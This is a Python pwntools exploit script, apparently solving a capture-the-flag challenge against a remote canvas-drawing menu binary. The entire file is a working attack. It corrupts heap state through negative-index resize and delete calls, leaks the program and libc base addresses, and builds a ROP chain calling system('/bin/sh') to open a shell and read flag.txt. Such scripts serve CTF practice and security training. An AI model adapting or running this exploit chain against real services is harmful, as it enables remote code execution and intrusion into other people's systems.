#!/usr/bin/env python3
import sys
from pwn import *

context.binary = exe = ELF('./vuln')
libc = ELF('./libc.so.6')
HOST, PORT = sys.argv[1], sys.argv[2]
io = remote(HOST, PORT)
# context.terminal = ['tmux', 'splitw','-h','-p','80'];io = process([exe.path])

def cmd(c):
    io.sendlineafter(b'> ', str(c).encode())

def add_canvas(idx, width, height):
    cmd(1)
    io.sendlineafter(b': ', str(idx).encode())
    io.sendlineafter(b': ', str(width).encode())
    io.sendlineafter(b': ', str(height).encode())

def resize_canvas(idx, width, height):
    cmd(2)
    io.sendlineafter(b': ', str(idx).encode())
    io.sendlineafter(b': ', str(width).encode())
    io.sendlineafter(b': ', str(height).encode())

def draw(idx, data, w, h, endings):
    cmd(3)
    io.sendlineafter(b': ', str(idx).encode())
    for i in range(h):
        io.send(data[i*w:i*w+w] + p8(endings[i]))

def show(idx):
    cmd(4)
    io.sendlineafter(b': ', str(idx).encode())

def rate(idx, rate, comment=b''):
    cmd(5)
    io.sendlineafter(b': ', str(idx).encode())
    io.sendlineafter(b': ', str(rate).encode())
    if comment == b'':
        io.sendlineafter(b': ', b'n')
        return
    io.sendlineafter(b': ', b'y')
    io.sendafter(b': ', comment)

def delete_canvas(idx):
    cmd(6)
    io.sendlineafter(b': ', str(idx).encode())


add_canvas(0, 5, 5)         # initialize read
resize_canvas(-23, 0x28, 0x40)
delete_canvas(0)            # rewrite memset to free
resize_canvas(-23, 0, 0x40)
add_canvas(0, 5, 5)
rate(0, 0xa1, b'aaa')

delete_canvas(0)
add_canvas(0, 0x8, 0x12)
show(0)
io.recvuntil(b': \n')
for i in range(0x12):
    x = unpack(io.recvline()[:-1], 'all')
    print(hex(x))
    if i == 0:
        exe.address = x - 0x20ef
    elif i == 1:
        libc.address = x - 0x8102a

print('[+] exe: ', hex(exe.address))
print('[+] libc: ', hex(libc.address))

pop_rdi = libc.address+0x2a3e5
ret = libc.address+0x29cd6

pl = p64(exe.address+0x1787)*10      # ret addr for `read` in `draw`
pl += flat([
    exe.address+0x4100,     # this data is on stack during `draw` execution
    11,                     # index
    0xaaaaaaa,
    ret,
    pop_rdi,
    next(libc.search(b'/bin/sh\0')),
    libc.sym.system,
    0xaaaaaaa
])
draw(0, pl, 8, 0x12, p8(0x87) * 9 + p8(0x10) + p8(0x0a) * (0x12-10))

io.sendline(b'cat flag.txt')

io.interactive()
